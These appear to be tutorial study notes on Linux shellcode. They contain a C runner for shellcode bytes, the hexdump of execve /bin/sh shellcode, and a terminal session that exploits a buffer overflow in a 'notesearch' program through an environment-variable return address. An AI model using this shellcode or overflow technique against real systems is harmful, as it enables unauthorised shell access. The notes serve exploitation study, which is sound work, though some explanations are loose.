# Shellcode

Shellcode is a special type of code injected remotely which hackers use to exploit a variety of software vulnerabilities. It is so named because it typically spawns a command shell from which attackers can take control of the affected system.

Remote shellcode is used when an attacker wants to target a vulnerable process running on another machine on a local network, intranet, or a remote network. If successfully executed, the shellcode can provide the attacker access to the target machine across the network.

Simple shellcode example: 

```c
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "my shellcode here";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}
```

```s
mov  eax, 32       ; assign: eax = 32
xor  eax, eax      ; exclusive OR
push eax           ; push something onto the stack
pop  ebx           ; pop something from the stack (what was on the stack in a register/variable)
call mysuperfunc   ; call a function
int  0x80          ; interrupt, kernel command
```

Code and a more extended explanation -> (Cocomelon Shellcode)[https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html]

# Shell-Spawning Shellcode

To spawn a shell, we just need to make a system call to execute the /bin/sh shell program.

Shellcode executed with nasm.

```
jet@github:~/code $ nasm exec_shell.s
jet@github:~/code $ wc -c exec_shell
36 exec_shell
jet@github:~/code $ hexdump -C exec_shell
00000000 eb 16 5b 31 c0 88 43 07 89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|
00000010 08 8d 53 0c b0 0b cd 80 e8 e5 ff ff ff 2f 62 69 |..S........../bi|
00000020 6e 2f 73 68 |n/sh|
00000024
jet@github:~/code $ export SHELLCODE=$(cat exec_shell)
jet@github:~/code $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9c0
jet@github:~/code $ ./notesearch $(perl -e 'print "\xc0\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
```

The code could be shorter but this is a clear example.

# Port Binding Shellcode

Onces we have our shellcode ready, we'll need to connect it over the network for stabishing a connection between the server and the client.

*From /usr/include/linux/net.h*

```c
#define SYS_SOCKET 1 /* sys_socket(2) */
#define SYS_BIND 2 /* sys_bind(2) */
#define SYS_CONNECT 3 /* sys_connect(2) */
#define SYS_LISTEN 4 /* sys_listen(2) */
#define SYS_ACCEPT 5 /* sys_accept(2) */
#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */
#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */
#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */
#define SYS_SEND 9 /* sys_send(2) */
#define SYS_RECV 10 /* sys_recv(2) */
#define SYS_SENDTO 11 /* sys_sendto(2) */
#define SYS_RECVFROM 12 /* sys_recvfrom(2) */
#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */
#define SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */
#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */
#define SYS_SENDMSG 16 /* sys_sendmsg(2) */
#define SYS_RECVMSG 17 /* sys_recvmsg(2) */
```

Call number from the first argument -> net.h

So, to make socket system calls using Linux, EAX is always 102 for socketcall(), EBX contains the type of socket call, and ECX is a pointer to the socket call’s arguments. 

# Extra

Special thanks to -> Hacking: The art of Explotation and Cocomelon (Documentation)